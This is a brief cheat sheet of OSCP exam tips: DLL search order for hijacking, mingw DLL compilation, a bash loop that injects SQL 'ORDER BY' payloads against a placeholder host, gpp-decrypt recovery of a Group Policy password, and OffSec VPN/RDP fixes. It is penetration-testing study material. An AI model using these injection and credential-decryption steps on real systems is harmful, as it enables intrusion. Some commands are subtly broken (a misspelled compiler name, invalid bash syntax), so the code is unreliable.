# Quick Tips for OSCP

#### DLL Hijacking - Search Order
1. Directory from which the application is loaded.
2. System directory.
3. 16-Bit system directory. 
4. Windows Directory.
5. Current Directory.
6. Directories listed in the %PATH% variable.

---

#### Cross Compile Code with MINGW
```bash
# cross compile regular code:
x86_64-w64-mingw32-gcc name_of_prg.c -o name_of_binary.exe
# turn the output into a dynamically linked loader (DLL):
x86_64-w64-mong32-gcc name_of_prg.cpp --shared -o name_of_DLL.dll
```

---

#### SQL Injection - Get Number of Columns in Table
```bash
#!/usr/bin/bash


for i in $(seq 1 10); do
	resp = curl -X POST http://IP/ --data "PARAMETER=' ORDER BY $i-- //";
	# url encode the paramter.
	if [[$resp | grep -i "unknown column"]]; then
	break
	done;

```
---

#### GPP-Decrypt (Kali)
Any passwords that are encrypted using the Group Policy Preferences on Windows, have a common decryption key.

These passwords can be decrypted using the `gpp-decrypt` command line tool on Kali.

```bash
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
# output
kali@kali:~$ P@$$w0rd
```
---

#### Fixing RDP Errors (OFFSEC)
```bash
sudo ifconfig tun0 mtu 1500 up # value from 700 to 1250 & 1500
sudo kill-all -w openvpn # replace service name as per convenience.
```

- Delete all "openvpn" files and generate a new one.
- Kill all openvpn processes.
- Start a new vpn connection on through tun0 and change it's MTU value from 1500 all the way down to 700 to see what works.
- Once RDP is successful, go into the machine and press CTRL + SHIFT + ESC and start Explorer.exe.
- Restart the Windows Explorer service from the task manager console.


